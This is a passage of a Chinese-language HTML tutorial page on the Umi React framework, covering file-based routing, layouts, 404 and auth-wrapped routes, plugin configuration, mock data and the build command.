实例</li></ul><h3 id="更多配置项"><a href="#更多配置项" class="headerlink" title="更多配置项"></a>更多配置项</h3><p>Umi 允许插件注册运行时配置，如果你使用插件，肯定会在插件里找到更多运行时的配置项。</p><h2 id="约定式路由"><a href="#约定式路由" class="headerlink" title="约定式路由"></a>约定式路由</h2><p>除配置式路由外，Umi 也支持约定式路由。约定式路由也叫文件路由，就是不需要手写配置，文件系统即路由，通过目录和文件及其命名分析出路由配置。</p><p><strong>如果没有 routes 配置，Umi 会进入约定式路由模式</strong>，然后分析 <code>src/pages</code> 目录拿到路由配置。</p><p>比如以下文件结构：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs bash">.<br>  └── pages<br>    ├── index.tsx<br>    └── users.tsx<br></code></pre></td></tr></table></figure><p>会得到以下路由配置，</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs js">[<br>  &#123; <span class="hljs-attr">exact</span>: <span class="hljs-literal">true</span>, <span class="hljs-attr">path</span>: <span class="hljs-string">&#x27;/&#x27;</span>, <span class="hljs-attr">component</span>: <span class="hljs-string">&#x27;@/pages/index&#x27;</span> &#125;,<br>  &#123; <span class="hljs-attr">exact</span>: <span class="hljs-literal">true</span>, <span class="hljs-attr">path</span>: <span class="hljs-string">&#x27;/users&#x27;</span>, <span class="hljs-attr">component</span>: <span class="hljs-string">&#x27;@/pages/users&#x27;</span> &#125;,<br>]<br></code></pre></td></tr></table></figure><p>需要注意的是，满足以下任意规则的文件不会被注册为路由，</p><ul><li>以 <code>.</code> 或 <code>_</code> 开头的文件或目录</li><li>以 <code>d.ts</code> 结尾的类型定义文件</li><li>以 <code>test.ts</code>、<code>spec.ts</code>、<code>e2e.ts</code> 结尾的测试文件（适用于 <code>.js</code>、<code>.jsx</code> 和 <code>.tsx</code> 文件）</li><li><code>components</code> 和 <code>component</code> 目录</li><li><code>utils</code> 和 <code>util</code> 目录</li><li>不是 <code>.js</code>、<code>.jsx</code>、<code>.ts</code> 或 <code>.tsx</code> 文件</li><li>文件内容不包含 JSX 元素</li></ul><h3 id="动态路由"><a href="#动态路由" class="headerlink" title="动态路由"></a>动态路由</h3><p>约定 <code>[]</code> 包裹的文件或文件夹为动态路由。</p><p>比如：</p><ul><li><code>src/pages/users/[id].tsx</code> 会成为 <code>/users/:id</code></li><li><code>src/pages/users/[id]/settings.tsx</code> 会成为 <code>/users/:id/settings</code></li></ul><p>举个完整的例子，比如以下文件结构，</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs bash">.<br>  └── pages<br>    └── [post]<br>      ├── index.tsx<br>      └── comments.tsx<br>    └── <span class="hljs-built_in">users</span><br>      └── [<span class="hljs-built_in">id</span>].tsx<br>    └── index.tsx<br></code></pre></td></tr></table></figure><p>会生成路由配置，</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs js">[<br>  &#123; <span class="hljs-attr">exact</span>: <span class="hljs-literal">true</span>, <span class="hljs-attr">path</span>: <span class="hljs-string">&#x27;/&#x27;</span>, <span class="hljs-attr">component</span>: <span class="hljs-string">&#x27;@/pages/index&#x27;</span> &#125;,<br>  &#123; <span class="hljs-attr">exact</span>: <span class="hljs-literal">true</span>, <span class="hljs-attr">path</span>: <span class="hljs-string">&#x27;/users/:id&#x27;</span>, <span class="hljs-attr">component</span>: <span class="hljs-string">&#x27;@/pages/users/[id]&#x27;</span> &#125;,<br>  &#123; <span class="hljs-attr">exact</span>: <span class="hljs-literal">true</span>, <span class="hljs-attr">path</span>: <span class="hljs-string">&#x27;/:post/&#x27;</span>, <span class="hljs-attr">component</span>: <span class="hljs-string">&#x27;@/pages/[post]/index&#x27;</span> &#125;,<br>  &#123;<br>    <span class="hljs-attr">exact</span>: <span class="hljs-literal">true</span>,<br>    <span class="hljs-attr">path</span>: <span class="hljs-string">&#x27;/:post/comments&#x27;</span>,<br>    <span class="hljs-attr">component</span>: <span class="hljs-string">&#x27;@/pages/[post]/comments&#x27;</span>,<br>  &#125;,<br>];<br></code></pre></td></tr></table></figure><h3 id="动态可选路由"><a href="#动态可选路由" class="headerlink" title="动态可选路由"></a>动态可选路由</h3><p>约定 <code>[ $]</code> 包裹的文件或文件夹为动态可选路由。</p><p>比如：</p><ul><li><code>src/pages/users/[id$].tsx</code> 会成为 <code>/users/:id?</code></li><li><code>src/pages/users/[id$]/settings.tsx</code> 会成为 <code>/users/:id?/settings</code></li></ul><p>举个完整的例子，比如以下文件结构，</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs bash">.<br>  └── pages<br>    └── [post$]<br>      └── comments.tsx<br>    └── <span class="hljs-built_in">users</span><br>      └── [<span class="hljs-built_in">id</span>$].tsx<br>    └── index.tsx<br></code></pre></td></tr></table></figure><p>会生成路由配置，</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs js">[<br>  &#123; <span class="hljs-attr">exact</span>: <span class="hljs-literal">true</span>, <span class="hljs-attr">path</span>: <span class="hljs-string">&#x27;/&#x27;</span>, <span class="hljs-attr">component</span>: <span class="hljs-string">&#x27;@/pages/index&#x27;</span> &#125;,<br>  &#123; <span class="hljs-attr">exact</span>: <span class="hljs-literal">true</span>, <span class="hljs-attr">path</span>: <span class="hljs-string">&#x27;/users/:id?&#x27;</span>, <span class="hljs-attr">component</span>: <span class="hljs-string">&#x27;@/pages/users/[id$]&#x27;</span> &#125;,<br>  &#123;<br>    <span class="hljs-attr">exact</span>: <span class="hljs-literal">true</span>,<br>    <span class="hljs-attr">path</span>: <span class="hljs-string">&#x27;/:post?/comments&#x27;</span>,<br>    <span class="hljs-attr">component</span>: <span class="hljs-string">&#x27;@/pages/[post$]/comments&#x27;</span>,<br>  &#125;,<br>];<br></code></pre></td></tr></table></figure><h3 id="嵌套路由"><a href="#嵌套路由" class="headerlink" title="嵌套路由"></a>嵌套路由</h3><p>Umi 里约定目录下有 <code>_layout.tsx</code> 时会生成嵌套路由，以 <code>_layout.tsx</code> 为该目录的 layout。layout 文件需要返回一个 React 组件，并通过 <code>props.children</code> 渲染子组件。</p><p>比如以下目录结构，</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs bash">.<br>└── pages<br>    └── <span class="hljs-built_in">users</span><br>        ├── _layout.tsx<br>        ├── index.tsx<br>        └── list.tsx<br></code></pre></td></tr></table></figure><p>会生成路由，</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs js">[<br>  &#123; <span class="hljs-attr">exact</span>: <span class="hljs-literal">false</span>, <span class="hljs-attr">path</span>: <span class="hljs-string">&#x27;/users&#x27;</span>, <span class="hljs-attr">component</span>: <span class="hljs-string">&#x27;@/pages/users/_layout&#x27;</span>,<br>    <span class="hljs-attr">routes</span>: [<br>      &#123; <span class="hljs-attr">exact</span>: <span class="hljs-literal">true</span>, <span class="hljs-attr">path</span>: <span class="hljs-string">&#x27;/users&#x27;</span>, <span class="hljs-attr">component</span>: <span class="hljs-string">&#x27;@/pages/users/index&#x27;</span> &#125;,<br>      &#123; <span class="hljs-attr">exact</span>: <span class="hljs-literal">true</span>, <span class="hljs-attr">path</span>: <span class="hljs-string">&#x27;/users/list&#x27;</span>, <span class="hljs-attr">component</span>: <span class="hljs-string">&#x27;@/pages/users/list&#x27;</span> &#125;,<br>    ]<br>  &#125;<br>]<br></code></pre></td></tr></table></figure><h3 id="全局-layout"><a href="#全局-layout" class="headerlink" title="全局 layout"></a>全局 layout</h3><p>约定 <code>src/layouts/index.tsx</code> 为全局路由。返回一个 React 组件，并通过 <code>props.children</code> 渲染子组件。</p><p>比如以下目录结构，</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs bash">.<br>└── src<br>    ├── layouts<br>    │   └── index.tsx<br>    └── pages<br>        ├── index.tsx<br>        └── users.tsx<br></code></pre></td></tr></table></figure><p>会生成路由，</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs js">[<br>  &#123; <span class="hljs-attr">exact</span>: <span class="hljs-literal">false</span>, <span class="hljs-attr">path</span>: <span class="hljs-string">&#x27;/&#x27;</span>, <span class="hljs-attr">component</span>: <span class="hljs-string">&#x27;@/layouts/index&#x27;</span>,<br>    <span class="hljs-attr">routes</span>: [<br>      &#123; <span class="hljs-attr">exact</span>: <span class="hljs-literal">true</span>, <span class="hljs-attr">path</span>: <span class="hljs-string">&#x27;/&#x27;</span>, <span class="hljs-attr">component</span>: <span class="hljs-string">&#x27;@/pages/index&#x27;</span> &#125;,<br>      &#123; <span class="hljs-attr">exact</span>: <span class="hljs-literal">true</span>, <span class="hljs-attr">path</span>: <span class="hljs-string">&#x27;/users&#x27;</span>, <span class="hljs-attr">component</span>: <span class="hljs-string">&#x27;@/pages/users&#x27;</span> &#125;,<br>    ],<br>  &#125;,<br>]<br></code></pre></td></tr></table></figure><p>一个自定义的全局 <code>layout</code> 如下：</p><figure class="highlight tsx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs tsx"><span class="hljs-keyword">import</span> &#123; <span class="hljs-title class_">IRouteComponentProps</span> &#125; <span class="hljs-keyword">from</span> <span class="hljs-string">&#x27;umi&#x27;</span><br><span class="hljs-keyword">export</span> <span class="hljs-keyword">default</span> <span class="hljs-keyword">function</span> <span class="hljs-title function_">Layout</span>(<span class="hljs-params">&#123; children, location, route, history, match &#125;: IRouteComponentProps</span>) &#123;  <span class="hljs-keyword">return</span> children&#125;<br></code></pre></td></tr></table></figure><h3 id="不同的全局-layout"><a href="#不同的全局-layout" class="headerlink" title="不同的全局 layout"></a>不同的全局 layout</h3><p>你可能需要针对不同路由输出不同的全局 layout，Umi 不支持这样的配置，但你仍可以在 <code>src/layouts/index.tsx</code> 中对 <code>location.path</code> 做区分，渲染不同的 layout 。</p><p>比如想要针对 <code>/login</code> 输出简单布局，</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs js"><span class="hljs-keyword">export</span> <span class="hljs-keyword">default</span> <span class="hljs-keyword">function</span>(<span class="hljs-params">props</span>) &#123;  <span class="hljs-keyword">if</span> (props.<span class="hljs-property">location</span>.<span class="hljs-property">pathname</span> === <span class="hljs-string">&#x27;/login&#x27;</span>) &#123;    <span class="hljs-keyword">return</span> <span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">SimpleLayout</span>&gt;</span>&#123; props.children &#125;<span class="hljs-tag">&lt;/<span class="hljs-name">SimpleLayout</span>&gt;</span></span>  &#125;<br>  <span class="hljs-keyword">return</span> (    <span class="language-xml"><span class="hljs-tag">&lt;&gt;</span>      <span class="hljs-tag">&lt;<span class="hljs-name">Header</span> /&gt;</span>      &#123; props.children &#125;      <span class="hljs-tag">&lt;<span class="hljs-name">Footer</span> /&gt;</span>    <span class="hljs-tag">&lt;/&gt;</span></span>  );&#125;<br></code></pre></td></tr></table></figure><h3 id="404-路由"><a href="#404-路由" class="headerlink" title="404 路由"></a>404 路由</h3><p>约定 <code>src/pages/404.tsx</code> 为 404 页面，需返回 React 组件。</p><p>比如以下目录结构，</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs bash">.<br>└── pages<br>    ├── 404.tsx<br>    ├── index.tsx<br>    └── users.tsx<br></code></pre></td></tr></table></figure><p>会生成路由，</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs js">[<br>  &#123; <span class="hljs-attr">exact</span>: <span class="hljs-literal">true</span>, <span class="hljs-attr">path</span>: <span class="hljs-string">&#x27;/&#x27;</span>, <span class="hljs-attr">component</span>: <span class="hljs-string">&#x27;@/pages/index&#x27;</span> &#125;,<br>  &#123; <span class="hljs-attr">exact</span>: <span class="hljs-literal">true</span>, <span class="hljs-attr">path</span>: <span class="hljs-string">&#x27;/users&#x27;</span>, <span class="hljs-attr">component</span>: <span class="hljs-string">&#x27;@/pages/users&#x27;</span> &#125;,<br>  &#123; <span class="hljs-attr">component</span>: <span class="hljs-string">&#x27;@/pages/404&#x27;</span> &#125;,<br>]<br></code></pre></td></tr></table></figure><p>这样，如果访问 <code>/foo</code>，<code>/</code> 和 <code>/users</code> 都不能匹配，会 fallback 到 404 路由，通过 <code>src/pages/404.tsx</code> 进行渲染。</p><h3 id="权限路由"><a href="#权限路由" class="headerlink" title="权限路由"></a>权限路由</h3><p>通过指定高阶组件 <code>wrappers</code> 达成效果。</p><p>如下，<code>src/pages/user</code>：</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs js"><span class="hljs-keyword">import</span> <span class="hljs-title class_">React</span> <span class="hljs-keyword">from</span> <span class="hljs-string">&#x27;react&#x27;</span><br><span class="hljs-keyword">function</span> <span class="hljs-title function_">User</span>(<span class="hljs-params"></span>) &#123;  <span class="hljs-keyword">return</span> <span class="language-xml"><span class="hljs-tag">&lt;&gt;</span>user profile<span class="hljs-tag">&lt;/&gt;</span></span>&#125;<br><span class="hljs-title class_">User</span>.<span class="hljs-property">wrappers</span> = [<span class="hljs-string">&#x27;@/wrappers/auth&#x27;</span>]<br><span class="hljs-keyword">export</span> <span class="hljs-keyword">default</span> <span class="hljs-title class_">User</span><br></code></pre></td></tr></table></figure><p>然后在 <code>src/wrappers/auth</code> 中，</p><figure class="highlight jsx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs jsx"><span class="hljs-keyword">import</span> &#123; <span class="hljs-title class_">Redirect</span> &#125; <span class="hljs-keyword">from</span> <span class="hljs-string">&#x27;umi&#x27;</span><br><span class="hljs-keyword">export</span> <span class="hljs-keyword">default</span> (props) =&gt; &#123;  <span class="hljs-keyword">const</span> &#123; isLogin &#125; = <span class="hljs-title function_">useAuth</span>();  <span class="hljs-keyword">if</span> (isLogin) &#123;    <span class="hljs-keyword">return</span> <span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">div</span>&gt;</span>&#123; props.children &#125;<span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span></span>;  &#125; <span class="hljs-keyword">else</span> &#123;    <span class="hljs-keyword">return</span> <span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">Redirect</span> <span class="hljs-attr">to</span>=<span class="hljs-string">&quot;/login&quot;</span> /&gt;</span></span>;  &#125;&#125;<br></code></pre></td></tr></table></figure><p>这样，访问 <code>/user</code>，就通过 <code>useAuth</code> 做权限校验，如果通过，渲染 <code>src/pages/user</code>，否则跳转到 <code>/login</code>，由 <code>src/pages/login</code> 进行渲染。</p><h3 id="扩展路由属性"><a href="#扩展路由属性" class="headerlink" title="扩展路由属性"></a>扩展路由属性</h3><p>支持在代码层通过导出静态属性的方式扩展路由。</p><p>比如：</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs js"><span class="hljs-keyword">function</span> <span class="hljs-title function_">HomePage</span>(<span class="hljs-params"></span>) &#123;  <span class="hljs-keyword">return</span> <span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">h1</span>&gt;</span>Home Page<span class="hljs-tag">&lt;/<span class="hljs-name">h1</span>&gt;</span></span>;&#125;<br><span class="hljs-title class_">HomePage</span>.<span class="hljs-property">title</span> = <span class="hljs-string">&#x27;Home Page&#x27;</span>;<br><span class="hljs-keyword">export</span> <span class="hljs-keyword">default</span> <span class="hljs-title class_">HomePage</span>;<br></code></pre></td></tr></table></figure><p>其中的 <code>title</code> 会附加到路由配置中。</p><h2 id="插件"><a href="#插件" class="headerlink" title="插件"></a>插件</h2><h3 id="插件的-id-和-key"><a href="#插件的-id-和-key" class="headerlink" title="插件的 id 和 key"></a>插件的 id 和 key</h3><p>每个插件都会对应一个 id 和一个 key，<strong>id 是路径的简写</strong>，<strong>key 是进一步简化后用于配置的唯一值</strong>。</p><p>比如插件 <code>/node_modules/@umijs/plugin-foo/index.js</code>，通常来说，其 id 为 <code>@umijs/plugin-foo</code>，key 为 <code>foo</code>。</p><h3 id="启用插件"><a href="#启用插件" class="headerlink" title="启用插件"></a>启用插件</h3><p>插件有多种启用方式，</p><h4 id="package-json-依赖"><a href="#package-json-依赖" class="headerlink" title="package.json 依赖"></a>package.json 依赖</h4><p>Umi 会自动检测 <code>dependencies</code> 和 <code>devDependencies</code> 里的 umi 插件，比如：</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs json"><span class="hljs-punctuation">&#123;</span><br>  <span class="hljs-attr">&quot;dependencies&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">&#123;</span><br>    <span class="hljs-attr">&quot;@umijs/preset-react&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;1&quot;</span><br>  <span class="hljs-punctuation">&#125;</span><br><span class="hljs-punctuation">&#125;</span><br></code></pre></td></tr></table></figure><p>那么 <code>@umijs/preset-react</code> 会自动被注册，无需在配置里重复声明。</p><h4 id="配置-1"><a href="#配置-1" class="headerlink" title="配置"></a>配置</h4><p>在配置里可通过 <code>presets</code> 和 <code>plugins</code> 配置插件，比如：</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs js"><span class="hljs-keyword">export</span> <span class="hljs-keyword">default</span> &#123;<br>  <span class="hljs-attr">presets</span>: [<span class="hljs-string">&#x27;./preset&#x27;</span>, <span class="hljs-string">&#x27;foo/presets&#x27;</span>],<br>  <span class="hljs-attr">plugins</span>: [<span class="hljs-string">&#x27;./plugin&#x27;</span>],<br>&#125;<br></code></pre></td></tr></table></figure><p>通常用于几种情况：</p><ol><li>项目相对路径的插件</li><li>非 npm 包入口文件的插件</li></ol><p>注意：</p><ul><li>请不要配置 npm 包的插件，否则会报重复注册的错误</li></ul><h4 id="环境变量"><a href="#环境变量" class="headerlink" title="环境变量"></a>环境变量</h4><p>还可通过环境变量 <code>UMI_PRESETS</code> 和 <code>UMI_PLUGINS</code> 注册额外插件。</p><p>比如：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">$ UMI_PRESETS=/a/b/preset.js umi dev<br></code></pre></td></tr></table></figure><p>注意：</p><ul><li>项目里不建议使用，通常用于基于 umi 的框架二次封装</li></ul><h3 id="检查插件注册情况"><a href="#检查插件注册情况" class="headerlink" title="检查插件注册情况"></a>检查插件注册情况</h3><h4 id="通过命令行"><a href="#通过命令行" class="headerlink" title="通过命令行"></a>通过命令行</h4><p>可以执行以下命令，</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash">$ umi plugin list<br><span class="hljs-comment"># 顺便看看他们分别用了哪些 key$ umi plugin list --key</span><br></code></pre></td></tr></table></figure><p>结果通常如下，</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash">Plugins:<br>    - @umijs/preset-built-in [key: builtIn] (preset)    - @@/registerMethods [key: registerMethods]    - @@/routes [key: routes]    - @@/generateFiles/core/history [key: <span class="hljs-built_in">history</span>]    - @@/generateFiles/core/plugin [key: plugin]    - @@/generateFiles/core/routes [key: routes]    - ...<br></code></pre></td></tr></table></figure><h4 id="在插件里感知其他插件"><a href="#在插件里感知其他插件" class="headerlink" title="在插件里感知其他插件"></a>在插件里感知其他插件</h4><p>可通过 <code>api.hasPlugins(pluginId[])</code> 和 <code>api.hasPresets(pluginId[])</code> 的方式感知其他插件，详见插件 API。</p><h3 id="禁用插件"><a href="#禁用插件" class="headerlink" title="禁用插件"></a>禁用插件</h3><p>有两种方式可禁用插件，</p><h4 id="配置-key-为-false"><a href="#配置-key-为-false" class="headerlink" title="配置 key 为 false"></a>配置 key 为 false</h4><p>比如：</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs js"><span class="hljs-keyword">export</span> <span class="hljs-keyword">default</span> &#123;<br>  <span class="hljs-attr">mock</span>: <span class="hljs-literal">false</span>,<br>&#125;<br></code></pre></td></tr></table></figure><p>会禁用 Umi 内置的 mock 插件及其功能。</p><h4 id="在插件里禁用其他插件"><a href="#在插件里禁用其他插件" class="headerlink" title="在插件里禁用其他插件"></a>在插件里禁用其他插件</h4><p>可通过 <code>api.skipPlugins(pluginId[])</code> 的方式禁用，详见插件 API。</p><h3 id="配置插件"><a href="#配置插件" class="headerlink" title="配置插件"></a>配置插件</h3><p>通过插件的 key 来配置插件，比如：</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs js"><span class="hljs-keyword">export</span> <span class="hljs-keyword">default</span> &#123;<br>  <span class="hljs-attr">mock</span>: &#123; <span class="hljs-attr">exclude</span>: [<span class="hljs-string">&#x27;./foo&#x27;</span>] &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>这里的 mock 是 mock 插件的 key。</p><p>再比如我们安装一个插件 <code>umi-plugin-bar</code>，其 key 默认是 <code>bar</code>，就可以这么配置，</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs js"><span class="hljs-keyword">export</span> <span class="hljs-keyword">default</span> &#123;<br>  <span class="hljs-attr">bar</span>: &#123; ...balabala &#125;,<br>&#125;<br></code></pre></td></tr></table></figure><h2 id="Mock-数据"><a href="#Mock-数据" class="headerlink" title="Mock 数据"></a>Mock 数据</h2><p>Mock 数据是前端开发过程中必不可少的一环，是分离前后端开发的关键链路。通过预先跟服务器端约定好的接口，模拟请求数据甚至逻辑，能够让前端开发独立自主，不会被服务端的开发所阻塞。</p><h3 id="约定式-Mock-文件"><a href="#约定式-Mock-文件" class="headerlink" title="约定式 Mock 文件"></a>约定式 Mock 文件</h3><p>Umi 约定 <code>/mock</code> 文件夹下所有文件为 mock 文件。</p><p>比如：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs bash">.<br>├── mock<br>    ├── api.ts<br>    └── users.ts<br>└── src<br>    └── pages<br>        └── index.tsx<br></code></pre></td></tr></table></figure><p><code>/mock</code> 下的 <code>api.ts</code> 和 <code>users.ts</code> 会被解析为 mock 文件。</p><h3 id="编写-Mock-文件"><a href="#编写-Mock-文件" class="headerlink" title="编写 Mock 文件"></a>编写 Mock 文件</h3><p>如果 <code>/mock/api.ts</code> 的内容如下，</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs js"><span class="hljs-keyword">export</span> <span class="hljs-keyword">default</span> &#123;  <span class="hljs-comment">// 支持值为 Object 和 Array  &#x27;GET /api/users&#x27;: &#123; users: [1, 2] &#125;,</span><br>  <span class="hljs-comment">// GET 可忽略  &#x27;/api/users/1&#x27;: &#123; id: 1 &#125;,</span><br>  <span class="hljs-comment">// 支持自定义函数，API 参考 express@4  &#x27;POST /api/users/create&#x27;: (req, res) =&gt; &#123;    // 添加跨域请求头    res.setHeader(&#x27;Access-Control-Allow-Origin&#x27;, &#x27;*&#x27;);    res.end(&#x27;ok&#x27;);  &#125;,&#125;</span><br></code></pre></td></tr></table></figure><p>然后访问 <code>/api/users</code> 就能得到 <code>&#123; users: [1,2] &#125;</code> 的响应，其他以此类推。</p><h3 id="配置-Mock"><a href="#配置-Mock" class="headerlink" title="配置 Mock"></a>配置 Mock</h3><p>详见<a href="https://v3.umijs.org/config#mock">配置#mock</a>。</p><h3 id="如何关闭-Mock？"><a href="#如何关闭-Mock？" class="headerlink" title="如何关闭 Mock？"></a>如何关闭 Mock？</h3><p>可以通过配置关闭，</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs js"><span class="hljs-keyword">export</span> <span class="hljs-keyword">default</span> &#123;<br>  <span class="hljs-attr">mock</span>: <span class="hljs-literal">false</span>,<br>&#125;;<br></code></pre></td></tr></table></figure><p>也可以通过环境变量临时关闭，</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">$ MOCK=none umi dev<br></code></pre></td></tr></table></figure><h3 id="引入-Mock-js"><a href="#引入-Mock-js" class="headerlink" title="引入 Mock.js"></a>引入 Mock.js</h3><p><a href="http://mockjs.com/">Mock.js</a> 是常用的辅助生成模拟数据的三方库，借助他可以提升我们的 mock 数据能力。</p><p>比如：</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs js"><span class="hljs-keyword">import</span> mockjs <span class="hljs-keyword">from</span> <span class="hljs-string">&#x27;mockjs&#x27;</span>;<br><span class="hljs-keyword">export</span> <span class="hljs-keyword">default</span> &#123;  <span class="hljs-comment">// 使用 mockjs 等三方库  &#x27;GET /api/tags&#x27;: mockjs.mock(&#123;    &#x27;list|100&#x27;: [&#123; name: &#x27;@city&#x27;, &#x27;value|1-100&#x27;: 50, &#x27;type|0-2&#x27;: 1 &#125;],  &#125;),&#125;;</span><br></code></pre></td></tr></table></figure><h2 id="命令行工具"><a href="#命令行工具" class="headerlink" title="命令行工具"></a>命令行工具</h2><h3 id="umi-build"><a href="#umi-build" class="headerlink" title="umi build"></a>umi build</h3><p>编译构建 web 产物。通常需要针对部署环境，做特定的配置和环境变量修改。相关详情，请查阅<a href="https://v3.umijs.org/zh-CN/docs/deployment">部署</a>。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs bash">$ umi build<br>✔ Webpack  Compiled successfully <span class="hljs-keyword">in</span> 5.54s<br>  DONE  Compiled successfully <span class="hljs-keyword">in</span> 5547ms<br>Build success.✨  Done <span class="hljs-keyword">in</span> 9.77s.<br></code></pre></td></tr></table></figure><p>默认产物输出到项目的 <code>dist</code> 文件夹，你可以通过修改配置 <code>outputPath</code> 指定产物输出目录。 默认编译时会将 <code>public</code> 文件夹内的所有文件，原样拷贝到 <code>dist</code> 目录，如果你不需要这个特性，可以通过配置 <code>chainWebpack</code> 来删除它。</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs js"><span class="hljs-keyword">export</span> <span class="hljs-keyword">default</span> &#123;<br>  <span class="hljs-title function_">chainWebpack</span>(<span class="hljs-params">memo, &#123; env, webpack &#125;</span>) &#123;<br>    <span class="hljs-comment">// 删除 umi 内置插件</span><br>    memo.<span class="hljs-property">plugins</span>.<span class="hljs-title function_">delete</span>(<span class="hljs-string">&#x27;copy&#x27;</span>);<br>  